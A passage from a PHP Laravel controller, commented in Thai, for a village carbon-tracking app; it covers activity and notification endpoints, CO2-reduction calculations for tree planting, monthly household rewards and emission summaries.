                'message' => 'Activity created but failed to insert notifications: ' . $e->getMessage(),
                'activity_code' => $newActivityCode,
            ], 500);
        }

        // 8) Return success
        return response()->json([
            'status' => 200,
            'message' => 'Activity created and notifications sent successfully',
            'activity_code' => $newActivityCode,
            'notified_users' => $userCodes,
        ], 200);
    }


    public function getActivityByVillage(Request $request): JsonResponse
    {
        // 1) Validate incoming payload
        $validator = Validator::make($request->all(), [
            'Village_Code' => 'required|integer|exists:village,Village_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $villageCode = $validator->validated()['Village_Code'];

        // 2) Query activities by joining with user→village
        $activities = DB::table('activity')
            ->join('user', 'activity.User_Code', '=', 'user.User_Code')
            ->where('user.Village_Code', $villageCode)
            ->select([
                'activity.activity_Code AS activity_code',
                'activity.activity_Name AS activity_name',
                'activity.type           AS activity_type',
                'activity.Activity_detail AS detail',
                'activity.Count          AS want_count',
                'activity.Date           AS activity_date',
                'activity.Start          AS start_time',
                'activity.end            AS end_time',
                'activity.tree_detail    AS tree_detail_json',
                'activity.User_Code      AS created_by_user_code',
                'activity.status      AS status',
                'user.User_Name          AS created_by_user_name',
            ])
            ->orderBy('activity.Date', 'desc')
            ->get();

        // 3) ถ้าไม่มีข้อมูล คืน 204 No Content
        if ($activities->isEmpty()) {
            return response()->json([], 204);
        }

        // 4) แปลง tree_detail_json เป็น array และตอบกลับ
        $result = $activities->map(function ($row) {
            return [
                'activity_code' => $row->activity_code,
                'activity_name' => $row->activity_name,
                'activity_type' => $row->activity_type,
                'detail' => $row->detail,
                'want_count' => $row->want_count,
                'activity_date' => $row->activity_date,
                'start_time' => $row->start_time,
                'end_time' => $row->end_time,
                'status' => $row->status,
                'tree_details' => json_decode($row->tree_detail_json, true),
                'created_by' => [
                    'user_code' => $row->created_by_user_code,
                    'user_name' => $row->created_by_user_name,
                ],
            ];
        });

        // 5) คืน JSON พร้อม 200 OK
        return response()->json([
            'status' => 200,
            'data' => $result,
        ], 200);
    }

    public function getActivityByCode(Request $request, $activityCode): JsonResponse
    {
        $validator = Validator::make(
            ['activityCode' => $activityCode],
            ['activityCode' => 'required|integer|exists:activity,activity_Code']
        );

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        // 2) query
        $row = DB::table('activity')
            ->where('activity.activity_Code', $activityCode)
            ->select([
                'activity.activity_Code    AS activity_code',
                'activity.activity_Name    AS activity_name',
                'activity.type             AS activity_type',
                'activity.Activity_detail  AS detail',
                'activity.Count            AS want_count',
                'activity.Date             AS activity_date',
                'activity.Start            AS start_time',
                'activity.end              AS end_time',
                'activity.tree_detail      AS tree_detail_json',
                'activity.trash_weight     AS trash_weight',
                'activity.status           AS activity_status', // ✅ เพิ่มสถานะ
            ])
            ->first();

        // 3) not found
        if (!$row) {
            return response()->json([
                'status' => 404,
                'message' => 'Activity not found',
            ], 404);
        }

        // 4) decode tree_detail และเติม dead_count ถ้าไม่มี
        $treeDetails = json_decode($row->tree_detail_json, true);
        if (!is_array($treeDetails)) {
            $treeDetails = [];
        } else {
            foreach ($treeDetails as &$t) {
                // บางเรคคอร์ดเก่าอาจไม่มีคีย์นี้ → ใส่ 0 ให้
                if (!array_key_exists('dead_count', $t)) {
                    $t['dead_count'] = 0;
                } else {
                    // แคสต์ให้เป็นตัวเลขสวย ๆ
                    $t['dead_count'] = (int) $t['dead_count'];
                }
            }
            unset($t);
        }

        // 5) response
        return response()->json([
            'status' => 200,
            'data' => [
                'activity_code' => $row->activity_code,
                'activity_name' => $row->activity_name,
                'activity_type' => $row->activity_type,
                'detail' => $row->detail,
                'want_count' => $row->want_count,
                'activity_date' => $row->activity_date,
                'start_time' => $row->start_time,
                'end_time' => $row->end_time,
                'trash_weight' => $row->trash_weight,
                'status' => (int) $row->activity_status, // ✅ ส่งสถานะออกไปด้วย
                'tree_details' => $treeDetails,                // ✅ แต่ละตัวมี dead_count แน่นอน
            ],
        ], 200);
    }


    public function updateActivity(Request $request): JsonResponse
    {
        // 1) Validate payload
        $validator = Validator::make($request->all(), [
            'activity_code' => 'required|integer|exists:activity,activity_Code',
            'user_code' => 'required|integer|exists:user,User_Code',
            'village_code' => 'required|integer|exists:village,Village_Code',
            'activity_name' => 'required|string|max:255',
            'activity_type' => 'required|string|max:50',
            'detail' => 'nullable|string',
            'want_count' => 'required|integer|min:0',
            'activity_date' => 'required|date_format:Y-m-d',
            'start_time' => 'required|date_format:H:i',
            'end_time' => 'required|date_format:H:i|after_or_equal:start_time',
            'tree_details' => 'required|array',
            'tree_details.*.tree_code' => 'required|integer|exists:tree,tree_Code',
            'tree_details.*.count' => 'required|integer|min:0',
            'tree_details.*.dead_count' => 'nullable|integer|min:0',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        // 2) แปลง tree_details เป็น JSON สตริง ก่อนบันทึก
        $treeDetails = collect($data['tree_details'] ?? [])
            ->map(function ($row) {
                return [
                    'tree_code' => isset($row['tree_code']) ? (int) $row['tree_code'] : null,
                    'count' => isset($row['count']) ? (int) $row['count'] : 0,
                    'dead_count' => isset($row['dead_count']) ? (int) $row['dead_count'] : 0, // default 0
                ];
            })
            // ตัดแถวที่ไม่มี tree_code ออก ป้องกันขยะ
            ->filter(fn($r) => !is_null($r['tree_code']) && $r['tree_code'] > 0)
            ->values()
            ->all();

        $treeJson = json_encode($treeDetails, JSON_UNESCAPED_UNICODE);

        // 3) อัปเดต
        try {
            DB::table('activity')
                ->where('activity_Code', $data['activity_code'])
                ->update([
                    'User_Code' => $data['user_code'],
                    'Village_Code' => $data['village_code'],
                    'activity_Name' => $data['activity_name'],
                    'type' => $data['activity_type'],
                    'Activity_detail' => $data['detail'],
                    'Count' => $data['want_count'],
                    'Date' => $data['activity_date'],
                    'Start' => $data['start_time'],
                    'end' => $data['end_time'],
                    'tree_detail' => $treeJson,   // ถ้ามี timestamp
                ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Activity updated successfully',
        ], 200);
    }

    public function showNotification(Request $request): JsonResponse
    {
        // 1) Validate incoming payload
        $data = $request->validate([
            'user_code' => 'required|integer|exists:user,User_Code',
        ]);

        $userCode = $data['user_code'];

        // 2) Fetch notifications JOIN activity เพื่อดึงวันที่แล้ว orderBy ตามวันที่กิจกรรม (ใหม่→เก่า)
        $notifications = DB::table('notification')
            ->where('notification.User_Code', $userCode)
            ->join('activity', 'notification.activity_Code', '=', 'activity.activity_Code')
            ->orderBy('activity.Date', 'desc')
            ->select([
                'notification.activity_Code',
                'notification.User_Code',
                'notification.reading',
                'activity.activity_Name',
                'activity.Date as activity_date',
                'activity.Start as activity_start',
                'activity.end as activity_end',
                'activity.Activity_detail',
                'activity.Count',
                DB::raw('(SELECT COUNT(*) FROM joiner j WHERE j.activity_code = activity.activity_Code) as Joined_count'),
                'notification.join_status'
            ])
            ->get();

        // 3) นับจำนวนแจ้งเตือนที่ยังอ่านไม่ (reading = 0)
        $unreadCount = DB::table('notification')
            ->where('User_Code', $userCode)
            ->where('reading', 0)
            ->count();

        // 4) Return JSON
        return response()->json([
            'status' => 200,
            'unread_count' => $unreadCount,
            'notifications' => $notifications
        ], 200);
    }

    public function joinDetail(Request $request, $activityCode): JsonResponse
    {
        $validator = Validator::make(
            ['activityCode' => $activityCode],
            ['activityCode' => 'required|integer|exists:activity,activity_Code']
        );

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        // ❌ ไม่ต้อง join ตาราง joiner เพราะนับจำนวนด้วย subquery อยู่แล้ว
        $row = DB::table('activity')
            ->where('activity.activity_Code', $activityCode)
            ->select([
                'activity.activity_Code    AS activity_code',
                'activity.activity_Name    AS activity_name',
                'activity.type             AS activity_type',
                'activity.Activity_detail  AS detail',
                'activity.Count            AS want_count',
                'activity.Date             AS activity_date',
                'activity.Start            AS start_time',
                'activity.end              AS end_time',
                'activity.tree_detail      AS tree_detail_json',
                'activity.trash_weight',
                // อย่าใส่ activity.type ซ้ำอีกคอลัมน์
                DB::raw('(SELECT COUNT(*) 
                      FROM joiner j 
                      WHERE j.activity_Code = activity.activity_Code) AS joined_count')
            ])
            ->first();

        if (!$row) {
            return response()->json([
                'status' => 404,
                'message' => 'Activity not found',
            ], 404);
        }

        $treeDetails = json_decode($row->tree_detail_json, true);
        if (!is_array($treeDetails)) {
            $treeDetails = [];
        }

        // ดึงชื่อไม้เฉพาะเมื่อมี code
        $treeCodes = array_filter(array_map(
            fn($t) => (int) ($t['tree_code'] ?? 0),
            $treeDetails
        ));
        $treeNames = [];
        if (!empty($treeCodes)) {
            // map: tree_Code => tree_Name
            $treeNames = DB::table('tree')
                ->whereIn('tree_Code', $treeCodes)
                ->pluck('tree_Name', 'tree_Code')
                ->toArray();
        }

        foreach ($treeDetails as &$tree) {
            $code = (int) ($tree['tree_code'] ?? 0);
            $tree['tree_Name'] = $treeNames[$code] ?? 'ไม่ทราบชื่อ';
        }
        unset($tree);

        return response()->json([
            'status' => 200,
            'data' => [
                'activity_code' => $row->activity_code,
                'activity_name' => $row->activity_name,
                'activity_type' => $row->activity_type,
                'detail' => $row->detail,
                'want_count' => $row->want_count,
                'activity_date' => $row->activity_date,
                'start_time' => $row->start_time,
                'end_time' => $row->end_time,
                'tree_details' => $treeDetails,
                'trash_weight' => $row->trash_weight,
                'joined_count' => (int) $row->joined_count,
            ],
        ], 200);
    }


    public function joinActivity(Request $request): JsonResponse
    {
        // 1) ตรวจสอบ input
        $validator = Validator::make($request->all(), [
            'user_code' => 'required|integer|exists:user,User_Code',
            'activity_code' => 'required|integer|exists:activity,activity_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        // 2) ตรวจสอบว่าผู้ใช้นี้เคย join แล้วหรือยัง
        $exists = DB::table('joiner')
            ->where('user_code', $data['user_code'])
            ->where('activity_code', $data['activity_code'])
            ->exists();

        if ($exists) {
            return response()->json([
                'status' => 409,
                'message' => 'You have already joined this activity.',
            ], 409);
        }

        // 3) Insert ลงตาราง joiner
        DB::table('joiner')->insert([
            'user_code' => $data['user_code'],
            'activity_code' => $data['activity_code'],
            'status' => 0,
            'CO2_reducing' => 0,
        ]);

        // 4) อัปเดต notification.join_status = 1
        DB::table('notification')
            ->where('user_code', $data['user_code'])
            ->where('activity_code', $data['activity_code'])
            ->update([
                'join_status' => 1
            ]);

        return response()->json([
            'status' => 200,
            'message' => 'Joined activity and updated notification.',
        ]);
    }

    public function getJoinActivity(Request $request): JsonResponse
    {
        // 1) Validate
        $validator = Validator::make($request->all(), [
            'user_code' => 'required|integer|exists:user,User_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $userCode = $request->input('user_code');

        // 2) ดึงรายการ activity ที่ user เคย join
        $activities = DB::table('joiner')
            ->join('activity', 'joiner.activity_code', '=', 'activity.activity_Code')
            ->select(
                'activity.activity_Code as activity_code',
                'activity.activity_Name as activity_name',
                'activity.Activity_detail as detail',
                'activity.Date as activity_date',
                'activity.Start as start_time',
                'activity.end as end_time',
                'activity.Count as want_count',
                'joiner.status as aprove_status',
                DB::raw('(SELECT COUNT(*) FROM joiner j WHERE j.activity_code = activity.activity_Code) as joined_count')
            )
            ->where('joiner.user_code', $userCode)
            ->groupBy(
                'activity.activity_Code',
                'activity.activity_Name',
                'activity.Activity_detail',
                'activity.Date',
                'activity.Start',
                'activity.end',
                'activity.Count',
                'joiner.status'
            )
            ->get();

        return response()->json([
            'status' => 200,
            'data' => $activities,
        ]);
    }
    public function updateJoinStatus(Request $request): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'activity_code' => 'required|integer|exists:activity,activity_Code',
            'user_code' => 'required|integer|exists:user,User_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => false,
                'message' => 'ข้อมูลไม่ถูกต้อง',
                'errors' => $validator->errors(),
            ], 422);
        }

        $updated = DB::table('joiner')
            ->where('activity_Code', $request->activity_code)
            ->where('User_Code', $request->user_code)
            ->update(['status' => 1]);

        if ($updated) {
            return response()->json(['status' => true, 'message' => 'อัปเดตสำเร็จ']);
        } else {
            return response()->json(['status' => false, 'message' => 'ไม่พบข้อมูลที่ต้องการอัปเดต'], 404);
        }
    }

    public function deleteNoti(Request $request): JsonResponse
    {
        $v = Validator::make($request->all(), [
            'user_code' => 'required|integer|exists:user,User_Code',
            'activity_code' => 'required|integer|exists:activity,activity_Code',
        ]);

        if ($v->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid params',
                'errors' => $v->errors(),
            ], 422);
        }

        $user = (int) $request->input('user_code');
        $act = (int) $request->input('activity_code');

        // ลบตามคีย์ประกอบ
        DB::table('notification')
            ->where('User_Code', $user)
            ->where('activity_Code', $act)
            ->delete();

        // คำนวณจำนวนที่ยังไม่อ่านใหม่
        $unread = DB::table('notification')
            ->where('User_Code', $user)
            ->where('reading', 0)
            ->count();

        return response()->json([
            'success' => true,
            'message' => 'deleted',
            'unread_count' => $unread,
        ], 200);
    }

    public function updateActivityStatus(Request $request): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'activity_code' => 'required|integer|exists:activity,activity_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => false,
                'message' => 'ข้อมูลไม่ถูกต้อง',
                'errors' => $validator->errors(),
            ], 422);
        }

        $activityCode = (int) $request->activity_code;

        $updated = DB::table('activity')
            ->where('activity_Code', $activityCode)
            ->update(['status' => 1]);

        if ($updated) {
            return response()->json([
                'status' => true,
                'message' => 'อัปเดตสถานะกิจกรรมเรียบร้อยแล้ว',
            ], 200);
        }

        return response()->json([
            'status' => false,
            'message' => 'ไม่พบกิจกรรมหรือไม่สามารถอัปเดตได้',
        ], 404);
    }

    public function calculateAndInsertDailyReducingNoCron(Request $request): JsonResponse
    {
        $forDate = $request->input('forDate'); // body หรือ query ก็ได้
        $date = $forDate ?: now()->toDateString();

        DB::beginTransaction();
        try {
            // ดึงกิจกรรม "ปลูกต้นไม้" ที่อนุมัติแล้ว (status=1)
            $activities = DB::table('activity')
                ->where('type', 'ปลูกต้นไม้')
                ->where('status', 1)
                ->select(['activity_Code', 'tree_detail'])
                ->get();

            foreach ($activities as $act) {
                $details = json_decode($act->tree_detail ?? '[]', true);
                if (!is_array($details) || empty($details)) {
                    continue;
                }

                // รายการ tree_code ที่ต้องใช้
                $codes = array_values(array_unique(array_filter(array_map(
                    fn($r) => (int) ($r['tree_code'] ?? 0),
                    $details
                ))));
                if (empty($codes))
                    continue;

                // map: tree_Code => Co2_apsorb
                $absorbMap = DB::table('tree')
                    ->whereIn('tree_Code', $codes)
                    ->pluck('Co2_apsorb', 'tree_Code');

                // รวมปริมาณดูดซับทั้งหมดของกิจกรรม (หัก dead_count ก่อน)
                $totalAbsorb = 0.0;
                foreach ($details as $row) {
                    $code = (int) ($row['tree_code'] ?? 0);
                    $count = (float) ($row['count'] ?? 0);
                    $dead = (float) ($row['dead_count'] ?? 0); // << เพิ่มดึง dead_count
                    $survivors = max(0.0, $count - $dead);         // << ใช้จำนวนจริงที่รอด ไม่ให้ติดลบ
                    $coef = (float) ($absorbMap[$code] ?? 0);

                    if ($survivors <= 0 || $coef <= 0) {
                        continue;
                    }
                    $totalAbsorb += ($survivors * $coef);
                }

                if ($totalAbsorb <= 0) {
                    continue; // ไม่มีต้นไม้รอด/ไม่มีค่าสัมประสิทธิ์ดูดซับ
                }

                // รายชื่อผู้เข้าร่วมที่ยืนยันแล้ว
                $joinedUsers = DB::table('joiner')
                    ->where('activity_Code', $act->activity_Code)
                    ->where('status', 1)
                    ->pluck('User_Code');

                if ($joinedUsers->count() === 0) {
                    continue;
                }

                // เฉลี่ยต่อคน
                $perPerson = round($totalAbsorb / $joinedUsers->count(), 4);

                // บันทึกลง reducing (idempotent ต่อคน-กิจกรรม-วัน)
                foreach ($joinedUsers as $u) {
                    DB::table('reducing')->updateOrInsert(
                        [
                            'User_Code' => $u,
                            'activity_Code' => $act->activity_Code,
                            'date' => $date,
                        ],
                        [
                            'reducing' => $perPerson,
                        ]
                    );
                }
            }

            DB::commit();
            return response()->json([
                'status' => true,
                'message' => 'คำนวณและบันทึกลดก๊าซฯ รายวันเรียบร้อย',
                'date' => $date,
            ], 200);
        } catch (\Throwable $e) {
            DB::rollBack();
            return response()->json([
                'status' => false,
                'message' => 'ผิดพลาดระหว่างคำนวณ/บันทึก',
                'error' => $e->getMessage(),
            ], 500);
        }
    }


    public function calculateAndInsertDailyReducingWithCron(?string $forDate = null): JsonResponse
    {
        $date = $forDate ?: now()->toDateString(); // YYYY-MM-DD

        DB::beginTransaction();
        try {
            // ดึงกิจกรรม "ปลูกต้นไม้" ของวันที่กำหนด ที่ถูกอนุมัติแล้ว (status=1)
            $activities = DB::table('activity')
                ->where('type', 'ปลูกต้นไม้')
                ->where('status', 1)
                ->select(['activity_Code', 'tree_detail'])
                ->get();

            foreach ($activities as $act) {
                $details = json_decode($act->tree_detail ?? '[]', true);
                if (!is_array($details) || empty($details)) {
                    continue;
                }

                // list tree_code ที่ต้องใช้
                $codes = array_values(array_unique(array_filter(array_map(
                    fn($r) => (int) ($r['tree_code'] ?? 0),
                    $details
                ))));

                if (empty($codes))
                    continue;

                // map: tree_Code => Co2_apsorb
                $absorbMap = DB::table('tree')
                    ->whereIn('tree_Code', $codes)
                    ->pluck('Co2_apsorb', 'tree_Code');

                // รวมปริมาณดูดซับทั้งหมดของกิจกรรม
                $totalAbsorb = 0.0;
                foreach ($details as $row) {
                    $code = (int) ($row['tree_code'] ?? 0);
                    $count = (float) ($row['count'] ?? 0);
                    $coef = (float) ($absorbMap[$code] ?? 0);
                    $totalAbsorb += ($count * $coef);
                }

                // รายชื่อผู้เข้าร่วมที่ยืนยันแล้ว
                $joinedUsers = DB::table('joiner')
                    ->where('activity_Code', $act->activity_Code)
                    ->where('status', 1)
                    ->pluck('User_Code');

                if ($joinedUsers->count() === 0) {
                    continue;
                }

                // เฉลี่ยต่อคน
                $perPerson = round($totalAbsorb / $joinedUsers->count(), 4);

                // บันทึกลง reducing ต่อคน-ต่อกิจกรรม-ต่อวัน (idempotent)
                foreach ($joinedUsers as $u) {
                    DB::table('reducing')->updateOrInsert(
                        [
                            'User_Code' => $u,
                            'activity_Code' => $act->activity_Code,
                            'date' => $date,
                        ],
                        [
                            'reducing' => $perPerson,
                        ]
                    );
                }
            }

            DB::commit();
            return response()->json([
                'status' => true,
                'message' => 'คำนวณและบันทึกลดก๊าซฯ รายวันเรียบร้อย',
                'date' => $date,
            ], 200);
        } catch (\Throwable $e) {
            DB::rollBack();
            return response()->json([
                'status' => false,
                'message' => 'ผิดพลาดระหว่างคำนวณ/บันทึก',
                'error' => $e->getMessage(),
            ], 500);
        }
    }

    public function startActivity(Request $request): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'activity_code' => 'required|integer|exists:activity,activity_Code',
            'startStatus' => 'required|integer',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => false,
                'message' => 'ข้อมูลไม่ถูกต้อง',
                'errors' => $validator->errors(),
            ], 422);
        }
        if ($request->startStatus != 1) {
            $updated = DB::table('activity')
                ->where('activity_Code', $request->activity_code)
                ->update(['status' => 2]);
        }


        if ($updated) {
            return response()->json([
                'status' => true,
                'message' => 'อัปเดตสถานะกิจกรรมเรียบร้อยแล้ว',
            ]);
        } else {
            return response()->json([
                'status' => false,
                'message' => 'ไม่พบกิจกรรมหรือไม่สามารถอัปเดตได้',
            ], 404);
        }
    }

    public function cancelActivity(Request $request): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'activity_code' => 'required|integer|exists:activity,activity_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => false,
                'message' => 'ข้อมูลไม่ถูกต้อง',
                'errors' => $validator->errors(),
            ], 422);
        }

        $activityCode = $request->activity_code;

        // ตรวจสอบว่ามีผู้เข้าร่วมแล้วหรือไม่
        $hasJoiner = DB::table('notification')
            ->where('activity_Code', $activityCode)
            ->where('join_status', 1)
            ->exists();

        if ($hasJoiner) {
            return response()->json([
                'status' => false,
                'message' => 'ไม่สามารถยกเลิกกิจกรรมได้เนื่องจากมีผู้เข้าร่วมแล้ว',
            ], 403); // ใช้ 403 Forbidden
        }

        $updated = DB::table('activity')
            ->where('activity_Code', $activityCode)
            ->update(['status' => 3]); // กำหนดสถานะ 3 = ยกเลิก

        if ($updated) {
            return response()->json([
                'status' => true,
                'message' => 'ยกเลิกกิจกรรมเรียบร้อยแล้ว',
            ]);
        } else {
            return response()->json([
                'status' => false,
                'message' => 'ไม่พบกิจกรรมหรือไม่สามารถอัปเดตได้',
            ], 404);
        }
    }

    public function markAllAsRead(Request $request): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'user_code' => 'required|integer|exists:user,User_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => false,
                'message' => 'ข้อมูลไม่ถูกต้อง',
            ], 422);
        }

        DB::table('notification')
            ->where('User_Code', $request->user_code)
            ->update(['reading' => 1]);

        return response()->json([
            'status' => true,
            'message' => 'อัปเดตการอ่านแจ้งเตือนทั้งหมดเรียบร้อยแล้ว',
        ]);
    }

    public function awardMonthly(Request $request): JsonResponse
    {
        $target = now()->subMonthNoOverflow();
        $year = (int) ($request->input('year') ?? $target->year);
        $month = (int) ($request->input('month') ?? $target->month);

        // ช่วงวันของงวดที่เลือก
        $periodStart = \Carbon\Carbon::create($year, $month, 1, 0, 0, 0);
        $periodEnd = (clone $periodStart)->endOfMonth()->endOfDay();
        // ใช้ format ตรงคอลัมน์ใน DB: usings.Date_time (DATETIME), reducing.date (DATE)
        $startDt = $periodStart->toDateTimeString(); // 'Y-m-d H:i:s'
        $endDt = $periodEnd->toDateTimeString();   // 'Y-m-d H:i:s'
        $startD = $periodStart->toDateString();     // 'Y-m-d'
        $endD = $periodEnd->toDateString();       // 'Y-m-d'

        // ดึงรางวัลประเภท give_type = 'm'
        $rewards = DB::table('reward')
            ->where('give_type', 'm')
            ->select(['Reward_Code', 'Reward_Name', 'Reward_Type', 'reduce_value'])
            ->get();

        if ($rewards->isEmpty()) {
            return response()->json([
                'status' => true,
                'message' => 'ไม่มีรายการรางวัลแบบรายเดือนให้พิจารณา',
                'year' => $year,
                'month' => $month,
                'awarded' => [],
            ], 200);
        }

        // บ้านทั้งหมดที่มีสมาชิก (อาจปรับให้เฉพาะหมู่บ้านของคุณได้)
        $homes = DB::table('home')
            ->select('home_Code')
            ->get()
            ->pluck('home_Code')
            ->filter(fn($h) => $h > 0)
            ->values();

        if ($homes->isEmpty()) {
            return response()->json([
                'status' => true,
                'message' => 'ไม่พบบ้าน',
                'year' => $year,
                'month' => $month,
                'awarded' => [],
            ], 200);
        }

        DB::beginTransaction();
        try {
            $awardedRows = [];

            foreach ($homes as $homeCode) {
                // รายชื่อสมาชิกในบ้านนี้
                $userIds = DB::table('user')
                    ->where('home_Code', $homeCode)
                    ->pluck('User_Code');

                if ($userIds->isEmpty()) {
                    continue;
                }

                // CO2 รวมของบ้านในเดือนนั้น
                $sumCO2 = (float) DB::table('usings')
                    ->whereIn('User_Code', $userIds)
                    ->whereBetween('Date_time', [$startDt, $endDt])
                    ->sum('CO2_emission');

                // reducing รวมของบ้านในเดือนนั้น
                $sumReducing = (float) DB::table('reducing')
                    ->whereIn('User_Code', $userIds)
                    ->whereBetween('date', [$startD, $endD])
                    ->sum('reducing');

                foreach ($rewards as $rwd) {
                    $rewardCode = (int) $rwd->Reward_Code;
                    $rewardType = (int) $rwd->Reward_Type;
                    $reduceValue = (float) $rwd->reduce_value;

                    $eligible = false;

                    if ($rewardType === 1) {
                        // เงื่อนไข: CO2 รวมของบ้าน <= เพดาน reduce_value
                        $eligible = ($sumCO2 <= $reduceValue);
                    } elseif ($rewardType === 2) {
                        // เงื่อนไข: %Reducing >= reduce_value
                        // ป้องกันหารศูนย์
                        if ($sumCO2 > 0) {
                            $percent = ($sumReducing / $sumCO2) * 100.0;
                            $eligible = ($percent >= $reduceValue);
                        } else {
                            // ถ้า CO2 เป็น 0 ตลอดเดือน → ยังไม่มอบรางวัลแบบเปอร์เซ็นต์ (กันหารศูนย์)
                            $eligible = false;
                        }
                    } else {
                        // ไม่รองรับประเภทอื่น
                        continue;
                    }

                    if ($eligible) {
                        if ($sumCO2 != 0 || $sumReducing != 0) {
                            DB::table('rewarded')->updateOrInsert(
                                [
                                    'home_Code' => $homeCode,
                                    'Reward_Code' => $rewardCode,
                                ],
                                [
                                    'Have_Date' => now(),
                                ]
                            );
                        }
                        // upsert ป้องกันซ้ำในเดือนเดียวกัน


                        $awardedRows[] = [
                            'home_Code' => $homeCode,
                            'Reward_Code' => $rewardCode,
                            'sumCO2' => round($sumCO2, 4),
                            'sumReducing' => round($sumReducing, 4),
                        ];
                    }
                }
            }

            DB::commit();

            return response()->json([
                'status' => true,
                'message' => 'ประมวลผลมอบรางวัลรายเดือนเรียบร้อย',
                'year' => $year,
                'month' => $month,
                'awarded' => $awardedRows,
            ], 200);
        } catch (\Throwable $e) {
            DB::rollBack();
            return response()->json([
                'status' => false,
                'message' => 'เกิดข้อผิดพลาดระหว่างมอบรางวัล',
                'error' => $e->getMessage(),
            ], 500);
        }
    }

    public function rangeSummary(Request $request): JsonResponse
    {
        // 1) validate (คงเดิม: ช่วงวัน)
        $v = Validator::make($request->all(), [
            'home_Code' => 'required|integer|exists:home,home_Code',
            'start' => 'required|date_format:Y-m-d',
            'end' => 'required|date_format:Y-m-d',
        ]);
        if ($v->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid params',
                'errors' => $v->errors(),
            ], 422);
        }

        $homeCode = (int) $request->home_Code;
        $startDt = Carbon::parse($request->start)->startOfDay();
        $endDt = Carbon::parse($request->end)->endOfDay();

        if ($endDt->lt($startDt)) {
            return response()->json([
                'success' => false,
                'message' => 'end must be >= start',
            ], 422);
        }

        try {
            // 2) รวมทั้งช่วง (เอาไว้ลง meta)
            $emissionRow = DB::table('usings')
                ->join('user', 'usings.User_Code', '=', 'user.User_Code')
                ->where('user.home_Code', $homeCode)
                ->whereBetween('usings.Date_time', [$startDt, $endDt])
                ->selectRaw('
                COALESCE(SUM(usings.CO2_emission),0) AS co2,
                COALESCE(SUM(usings.CH4_emission),0) AS ch4,
                COALESCE(SUM(usings.N2O_emission),0) AS n2o
            ')
                ->first();

            $sumReducing = (float) DB::table('reducing')
                ->join('user', 'reducing.User_Code', '=', 'user.User_Code')
                ->where('user.home_Code', $homeCode)
                ->whereBetween('reducing.date', [$startDt->toDateString(), $endDt->toDateString()])
                ->sum('reducing');

            $emissions = [
                'co2' => (float) $emissionRow->co2,
                'ch4' => (float) $emissionRow->ch4,
                'n2o' => (float) $emissionRow->n2o,
                'total_gas' => (float) $emissionRow->co2 + (float) $emissionRow->ch4 + (float) $emissionRow->n2o,
            ];
            $net = [
                'net_co2' => max(0.0, $emissions['co2'] - $sumReducing),
            ];

            // 3) รายวัน: group by DATE() สำหรับ usings + reducing
            $dailyEmissions = DB::table('usings')
                ->join('user', 'usings.User_Code', '=', 'user.User_Code')
                ->where('user.home_Code', $homeCode)
                ->where('usings.input_type', 'd')
                ->whereBetween('usings.Date_time', [$startDt, $endDt])
                ->selectRaw('
                DATE(usings.Date_time) AS day,
                COALESCE(SUM(usings.CO2_emission),0) AS co2,
                COALESCE(SUM(usings.CH4_emission),0) AS ch4,
                COALESCE(SUM(usings.N2O_emission),0) AS n2o
            ')
                ->groupBy('day')
                ->orderBy('day')
                ->get();

            $dailyEmissionsFormElec = DB::table('usings')
                ->join('user', 'usings.User_Code', '=', 'user.User_Code')
                ->join('item', 'usings.Home_item_Code', '=', 'item.item_Code')
                ->where('user.home_Code', $homeCode)
                ->whereIn('item.type', ['N', 'I'])
                ->where('usings.input_type', 'd')
                ->whereBetween('usings.Date_time', [$startDt, $endDt])
                ->selectRaw('
                DATE(usings.Date_time) AS day,
                COALESCE(SUM(usings.CO2_emission),0) AS co2,
                COALESCE(SUM(usings.CH4_emission),0) AS ch4,
                COALESCE(SUM(usings.N2O_emission),0) AS n2o
            ')
                ->groupBy('day')
                ->orderBy('day')
                ->get();

            $monthlyEmissionsFormElec = DB::table('usings')
                ->join('user', 'usings.User_Code', '=', 'user.User_Code')
                ->where('user.home_Code', $homeCode)
                ->where('usings.input_type', 'm')

                ->whereBetween('usings.Date_time', [$startDt, $endDt])
                ->selectRaw('
        COALESCE(usings.CO2_emission,0) AS co2,
        COALESCE(usings.CH4_emission,0) AS ch4,
        COALESCE(usings.N2O_emission,0) AS n2o,
        usings.Distance_time AS monthly_unit
    ')
                ->get();

            $categoryRaw = DB::table('usings')
                ->join('user', 'usings.User_Code', '=', 'user.User_Code')
                ->leftJoin('item', 'usings.Home_item_Code', '=', 'item.Item_Code') // ← เช็คชื่อตาราง/คอลัมน์ให้ตรง schema
                ->where('user.home_Code', $homeCode)
                ->whereBetween('usings.Date_time', [$startDt, $endDt])
                ->selectRaw("
        CASE
          WHEN item.type IN ('I','N') THEN 'electric'
          WHEN item.type IN ('C','M') THEN 'vehicle'
          ELSE 'cooking'
        END AS category,
        COALESCE(SUM(usings.CO2_emission),0) AS co2
    ")
